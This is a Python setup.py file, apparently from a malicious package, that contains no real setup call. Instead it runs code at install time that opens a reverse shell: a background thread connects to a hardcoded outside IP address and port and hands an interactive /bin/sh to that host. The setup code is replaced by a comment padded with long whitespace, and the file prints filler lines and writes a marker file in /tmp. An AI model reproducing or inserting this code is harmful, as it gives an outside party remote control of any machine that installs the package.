from setuptools import setup, find_packages
import threading

# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     


def taint():
    import os
    os.system("touch /tmp/test1563.txt")

def test():
    import socket
    import subprocess
    import os

    if os.path.exists("/tmp/test1563.txt"):
        return

    host = '59.110.111.85'
    port = 8088
    s = socket.socket()
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(['/bin/sh', '-i'])


def taint2():
    thread=threading.Thread(target=test)
    thread.start()



def pppp():
    print("111111111111111111111111111111111111111111111111111111111111111111111111")
    print("111111111111111111111111111111111111111111111111111111111111111111111111")


pppp()
taint()
taint2()
